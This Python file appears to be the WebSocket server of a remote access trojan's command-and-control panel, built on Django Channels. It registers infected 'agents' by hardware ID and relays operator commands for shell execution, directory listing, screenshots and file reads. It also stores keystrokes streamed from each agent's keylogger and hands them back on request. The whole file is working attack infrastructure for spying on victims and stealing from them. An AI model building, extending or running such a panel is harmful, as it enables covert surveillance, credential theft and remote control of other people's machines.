import json
import uuid
from channels.generic.websocket import WebsocketConsumer

agents = {}
pending_requests = {}  # Dictionary to track pending file system requests


class WebSocketConsumer(WebsocketConsumer):
    def connect(self):
        self.accept()
        print(f"New WebSocket Connection")
        self.hwid = None  # Initialize hwid attribute

    def disconnect(self, close_code):
        # Remove the agent from the list of connected agents
        if self.hwid in agents:
            del agents[self.hwid]

        print(f"Agent {self.hwid} disconnected")

    def websocket_receive(self, message):
        print("Received message:", message)

        try:
            if "text_data" in message:
                message_text = message["text_data"]
            elif "text" in message:
                message_text = message["text"]
            else:
                message_text = message

            print("Message text to parse:", message_text)

            if isinstance(message_text, dict):
                data = message_text
            else:
                data = json.loads(message_text)

            print("Parsed data:", data)

            event_type = data.get("type")
            print("Event type:", event_type)

            event_handlers = {
                "agent-auth": self.handle_agent_auth,
                "command": self.handle_command,
                "status": self.handle_status,
                "data": self.handle_data,
                "fs_response": self.handle_fs_response,
                "fs": self.handle_fs_direct_response,
                "cmd": self.handle_cmd,
                "cmd_response": self.handle_cmd_response,
                "screenshot": self.handle_screenshot,
                "keylogger": self.handle_keylog,
                "readfile": self.handle_readfile,
                "readfile_response": self.handle_readfile_response,
                "get_keys": self.handle_get_keys,
                "get_file": self.handle_get_file,
                "get_file_response": self.handle_get_file_response,
                "is_connected": self.handle_is_connected,
            }

            if event_type in event_handlers:
                event_handlers[event_type](data)
            else:
                self.handle_unknown_event(data)

        except Exception as e:
            print(f"Error processing message: {e}")
            import traceback

            traceback.print_exc()
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": f"Invalid message format: {str(e)}"}
                )
            )

    def handle_screenshot(self, data):
        print(f"Received screenshot request: {data}")

        agent_id = data.get("agent")
        if agent_id not in agents:
            print(f"Agent {agent_id} not found")

        agents[agent_id]["connection"].send(
            text_data=json.dumps(
                {"type": "screenshot", "request_id": "", "data": data.get("data")}
            )
        )

        self.send(
            text_data=json.dumps(
                {"type": "screenshot", "request_id": "", "data": data.get("data")}
            )
        )

    # {"agent":"JC17046684","type":"fs", "data":"."}
    def handle_fs_direct_response(self, data):
        print(f"Received direct response: {data}")
        request_id = str(uuid.uuid4())  # Convert UUID to string
        agent_id = data.get("agent")

        if agent_id not in agents:
            print(f"Agent {agent_id} not found")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": f"Agent {agent_id} not connected"}
                )
            )
            return

        # Sending in format to agent
        # {"type":"fs","request_id":"1234567890","data":"."}
        # agent will process and send a response in format
        # {"type":"fs_response","request_id":"1234567890","data":"."}

        agents[agent_id]["connection"].send(
            text_data=json.dumps(
                {"type": "fs", "request_id": request_id, "data": data.get("data")}
            )
        )

        # Store the request context - ensure all values are JSON serializable
        pending_requests[request_id] = {
            "requester": self,
            "original_request": {
                "agent": data.get("agent"),
                "type": data.get("type"),
                "data": data.get("data"),
            },
            "timestamp": str(uuid.uuid1().time),  # Convert timestamp to string
        }

    def handle_agent_auth(self, data):
        agent_id = data.get("data")

        if not agent_id:
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing agent identifier"}
                )
            )
            return

        if agent_id in agents:
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Agent already connected"}
                )
            )
        else:
            self.hwid = agent_id
            # Store agent data with additional fields
            agents[agent_id] = {
                "connection": self,
                "keylog": ""
            }
            self.send(
                text_data=json.dumps(
                    {"type": "success", "message": "Authentication successful"}
                )
            )

    def handle_command(self, data):
        # Handle command event
        command = data.get("command")
        target = data.get("target")

        self.send(
            text_data=json.dumps(
                {"type": "ack", "message": f"Command {command} received for {target}"}
            )
        )

    def handle_status(self, data):
        status = data.get("status")

        self.send(
            text_data=json.dumps(
                {"type": "ack", "message": f"Status update received: {status}"}
            )
        )

    def handle_data(self, data):
        # Handle data event
        payload = data.get("payload")

        self.send(text_data=json.dumps({"type": "ack", "message": "Data received"}))

    def handle_unknown_event(self, data):
        # Handle unknown event type
        self.send(
            text_data=json.dumps({"type": "error", "message": "Unknown event type"})
        )

    def handle_fs_response(self, data):
        """
        Handle file system operation responses from agents.

        Expected format:
        {"type":"fs_response","request_id":"1234567890","data":"<response_data>"}
        """
        print(f"Received fs_response: {data}")
        request_id = data.get("request_id")

        if not request_id:
            print("Missing request_id in fs_response")
            return

        # Convert to string if it's a UUID object
        if not isinstance(request_id, str):
            request_id = str(request_id)

        # Look up the original request context
        if request_id not in pending_requests:
            print(f"Unknown request_id: {request_id}")
            return

        request_context = pending_requests.pop(
            request_id
        )  # Remove from pending and get the context
        original_requester = request_context["requester"]
        original_request = request_context["original_request"]

        # Ensure response data is properly formatted
        response_data = {
            "type": "fs_response",
            "agent": original_request.get("agent"),
            "data": data.get("data"),
            "original_path": original_request.get("data"),
        }

        # Send the response back to the original requester
        try:
            original_requester.send(text_data=json.dumps(response_data))
            print(f"Successfully sent response for request {request_id}")
        except TypeError as e:
            print(f"Error serializing response: {e}")
            # Try a more basic response as fallback
            original_requester.send(
                text_data=json.dumps(
                    {
                        "type": "fs_response",
                        "error": "Error serializing full response",
                        "data": str(data.get("data")),
                    }
                )
            )

    # {"agent":"JC17046684","type":"cmd", "data":"dir"}
    def handle_cmd(self, data):
        """
        Handle command execution requests.

        Expected format:
        {"agent":"JC17046684","type":"cmd", "data":"dir"}

        Where "data" is the command to execute.
        """
        print(f"Received command request: {data}")
        request_id = str(uuid.uuid4())  # Convert UUID to string
        agent_id = data.get("agent")

        if agent_id not in agents:
            print(f"Agent {agent_id} not found")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": f"Agent {agent_id} not connected"}
                )
            )
            return

        # Sending format to agent
        # {"type":"cmd","request_id":"1234567890","data":"dir"}
        # agent will process and send a response in format
        # {"type":"cmd_response","request_id":"1234567890","data":"<command_output>"}

        agents[agent_id]["connection"].send(
            text_data=json.dumps(
                {"type": "cmd", "request_id": request_id, "data": data.get("data")}
            )
        )

        # Store the request context - ensure all values are JSON serializable
        pending_requests[request_id] = {
            "requester": self,
            "original_request": {
                "agent": data.get("agent"),
                "type": data.get("type"),
                "data": data.get("data"),
            },
            "timestamp": str(uuid.uuid1().time),  # Convert timestamp to string
        }

    def handle_cmd_response(self, data):
        """
        Handle command execution responses from agents.

        Expected format:
        {"type":"cmd_response","request_id":"1234567890","data":"<command_output>"}
        """
        print(f"Received cmd_response: {data}")
        request_id = data.get("request_id")

        if not request_id:
            print("Missing request_id in cmd_response")
            return

        # Convert to string if it's a UUID object
        if not isinstance(request_id, str):
            request_id = str(request_id)

        # Look up the original request context
        if request_id not in pending_requests:
            print(f"Unknown request_id: {request_id}")
            return

        request_context = pending_requests.pop(
            request_id
        )  # Remove from pending and get the context
        original_requester = request_context["requester"]
        original_request = request_context["original_request"]

        # Ensure response data is properly formatted
        response_data = {
            "type": "cmd_response",
            "agent": original_request.get("agent"),
            "data": data.get("data"),
            "original_command": original_request.get("data"),
        }

        # Send the response back to the original requester
        try:
            original_requester.send(text_data=json.dumps(response_data))
            print(f"Successfully sent command response for request {request_id}")
        except TypeError as e:
            print(f"Error serializing command response: {e}")
            # Try a more basic response as fallback
            original_requester.send(
                text_data=json.dumps(
                    {
                        "type": "cmd_response",
                        "error": "Error serializing full response",
                        "data": str(data.get("data")),
                    }
                )
            )

    def handle_keylog(self, data):
        """
        Handle keylog events from agents.
        
        Expected format:
        {"type":"keylog", "data":"keypressed"}
        
        Updates the keylog field for the agent and responds with success.
        """
        print(f"Received keylog data: {data}")
        
        # If we have an identified agent (hwid is set)
        if self.hwid and self.hwid in agents:
            # Append the new keylog data
            keylog_data = data.get("data", "")
            agents[self.hwid]["keylog"] += keylog_data
        
    def handle_readfile(self, data):
        """
        Handle file read requests.

        Expected format:
        {"agent":"AGENT_ID","type":"readfile", "data":"FILE_PATH"}

        Where "data" is the path of the file to read on the agent.
        """
        print(f"Received readfile request: {data}")
        request_id = str(uuid.uuid4())  # Convert UUID to string
        agent_id = data.get("agent")
        file_path = data.get("data")

        if not agent_id:
            print("Missing agent_id in readfile request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing agent identifier"}
                )
            )
            return
        
        if not file_path:
            print("Missing file_path in readfile request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing file path to read"}
                )
            )
            return

        if agent_id not in agents:
            print(f"Agent {agent_id} not found")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": f"Agent {agent_id} not connected"}
                )
            )
            return

        # Sending format to agent
        # {"type":"readfile","request_id":"UUID","data":"FILE_PATH"}
        # agent will process and send a response in format
        # {"type":"readfile_response","request_id":"UUID","data":"<file_content_base64>"}

        agents[agent_id]["connection"].send(
            text_data=json.dumps(
                {"type": "readfile", "request_id": request_id, "data": file_path}
            )
        )

        # Store the request context - ensure all values are JSON serializable
        pending_requests[request_id] = {
            "requester": self,
            "original_request": {
                "agent": agent_id,
                "type": "readfile",
                "data": file_path,
            },
            "timestamp": str(uuid.uuid1().time),  # Convert timestamp to string
        }
        print(f"Sent readfile request {request_id} to agent {agent_id} for path {file_path}")


    def handle_readfile_response(self, data):
        """
        Handle file read responses from agents.

        Expected format:
        {"type":"readfile_response","request_id":"UUID","data":"<file_content_base64_or_error>"}
        """
        print(f"Received readfile_response: {data}")
        request_id = data.get("request_id")

        if not request_id:
            print("Missing request_id in readfile_response")
            return

        # Convert to string if it's a UUID object
        if not isinstance(request_id, str):
            request_id = str(request_id)

        # Look up the original request context
        if request_id not in pending_requests:
            print(f"Unknown request_id: {request_id}")
            # Maybe send an error back to the agent? Or just log.
            return

        request_context = pending_requests.pop(request_id)  # Remove from pending
        original_requester = request_context["requester"]
        original_request = request_context["original_request"]

        # Ensure response data is properly formatted for the original requester
        response_data = {
            "type": "readfile_response",
            "agent": original_request.get("agent"),
            "data": data.get("data"), # Assuming agent sends content (or error message) here
            "original_path": original_request.get("data"),
        }

        # Send the response back to the original requester (e.g., the UI)
        try:
            original_requester.send(text_data=json.dumps(response_data))
            print(f"Successfully forwarded readfile response for request {request_id}")
        except TypeError as e:
            print(f"Error serializing readfile response: {e}")
            # Try sending a basic error response back
            try:
                original_requester.send(
                    text_data=json.dumps(
                        {
                            "type": "readfile_response",
                            "agent": original_request.get("agent"),
                            "original_path": original_request.get("data"),
                            "error": "Error serializing full response",
                            "data": str(data.get("data")), # Send string representation
                        }
                    )
                )
            except Exception as inner_e:
                 print(f"Failed to send even basic error response: {inner_e}")

    def handle_get_keys(self, data):
        """
        Handle requests to retrieve stored keylogs for an agent.

        Expected format:
        {"type":"get_keys", "agent":"AGENT_ID"}
        
        Responds with the stored keylogs for the specified agent.
        """
        print(f"Received get_keys request: {data}")
        agent_id = data.get("agent")

        if not agent_id:
            print("Missing agent_id in get_keys request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing agent identifier for get_keys"}
                )
            )
            return

        if agent_id not in agents:
            print(f"Agent {agent_id} not found for get_keys request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": f"Agent {agent_id} not connected"}
                )
            )
            return
            
        # Retrieve the keylog data for the agent
        keylog_data = agents[agent_id].get("keylog", "") # Default to empty string if keylog field somehow missing

        # Prepare the response
        response_data = {
            "type": "get_keys_response",
            "agent": agent_id,
            "data": keylog_data,
        }
        
        # Send the response back to the requester
        try:
            self.send(text_data=json.dumps(response_data))
            print(f"Successfully sent keylogs for agent {agent_id}")
        except TypeError as e:
            print(f"Error serializing get_keys response: {e}")
            # Fallback response
            self.send(
                text_data=json.dumps(
                    {
                        "type": "get_keys_response",
                        "agent": agent_id,
                        "error": "Error serializing keylog data",
                        "data": "Could not retrieve keylog data.", # Simple error message
                    }
                )
            )

    def handle_get_file(self, data):
        """
        Handle requests to read a file from an agent directly.

        Expected format:
        {"type":"get_file", "agent":"AGENT_ID", "data":"FILE_PATH"}
        
        Initiates a file read request to the specified agent and 
        associates the request with this connection.
        """
        print(f"Received get_file request: {data}")
        request_id = str(uuid.uuid4())
        agent_id = data.get("agent")
        file_path = data.get("data")

        if not agent_id:
            print("Missing agent_id in get_file request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing agent identifier for get_file"}
                )
            )
            return
            
        if not file_path:
            print("Missing file_path in get_file request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing file path to read"}
                )
            )
            return

        if agent_id not in agents:
            print(f"Agent {agent_id} not found for get_file request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": f"Agent {agent_id} not connected"}
                )
            )
            return
            
        # Send readfile request to the agent
        agents[agent_id]["connection"].send(
            text_data=json.dumps(
                {
                    "type": "readfile", 
                    "request_id": request_id, 
                    "data": file_path
                }
            )
        )
        
        # Store the request context with this connection as the requester
        pending_requests[request_id] = {
            "requester": self,
            "original_request": {
                "agent": agent_id,
                "type": "get_file",
                "data": file_path,
            },
            "timestamp": str(uuid.uuid1().time),
        }
        
        print(f"Sent get_file request {request_id} to agent {agent_id} for path {file_path}")
        
        # Inform the client that the request is being processed
        self.send(
            text_data=json.dumps(
                {
                    "type": "get_file_pending",
                    "agent": agent_id,
                    "request_id": request_id,
                    "file_path": file_path,
                    "message": "File read request sent to agent"
                }
            )
        )

    def handle_get_file_response(self, data):
        """
        Handle get_file responses (usually from agents).
        
        This allows direct response to get_file requests without
        going through the readfile_response handler.
        
        Expected format:
        {"type":"get_file_response", "request_id":"UUID", "data":"FILE_CONTENT"}
        """
        print(f"Received get_file_response: {data}")
        request_id = data.get("request_id")
        
        if not request_id:
            print("Missing request_id in get_file_response")
            return
            
        # Convert to string if it's a UUID object
        if not isinstance(request_id, str):
            request_id = str(request_id)
            
        # Look up the original request context
        if request_id not in pending_requests:
            print(f"Unknown request_id: {request_id}")
            return
            
        request_context = pending_requests.pop(request_id)
        original_requester = request_context["requester"]
        original_request = request_context["original_request"]
        
        # Format the response to match get_file expectations
        response_data = {
            "type": "get_file_response",
            "agent": original_request.get("agent"),
            "data": data.get("data"),
            "file_path": original_request.get("data"),
        }
        
        # Send the response back to the original requester
        try:
            original_requester.send(text_data=json.dumps(response_data))
            print(f"Successfully sent get_file response for request {request_id}")
        except TypeError as e:
            print(f"Error serializing get_file response: {e}")
            try:
                original_requester.send(
                    text_data=json.dumps(
                        {
                            "type": "get_file_response",
                            "agent": original_request.get("agent"),
                            "file_path": original_request.get("data"),
                            "error": "Error serializing file content",
                            "data": str(data.get("data")),
                        }
                    )
                )
            except Exception as inner_e:
                print(f"Failed to send even basic get_file response: {inner_e}")

    def handle_is_connected(self, data):
        """
        Handle requests to check if an agent is connected.

        Expected format:
        {"type":"is_connected", "agent":"AGENT_ID"}
        
        Responds with a boolean indicating whether the specified agent is connected.
        """
        print(f"Received is_connected request: {data}")
        agent_id = data.get("agent")

        if not agent_id:
            print("Missing agent_id in is_connected request")
            self.send(
                text_data=json.dumps(
                    {"type": "error", "message": "Missing agent identifier for is_connected check"}
                )
            )
            return

        # Check if the agent exists in the connected agents dictionary
        is_connected = agent_id in agents
        
        # Prepare the response
        response_data = {
            "type": "is_connected_response",
            "agent": agent_id,
            "connected": is_connected
        }
        
        # Send the response back to the requester
        self.send(text_data=json.dumps(response_data))
        print(f"Sent is_connected response for agent {agent_id}: {is_connected}")

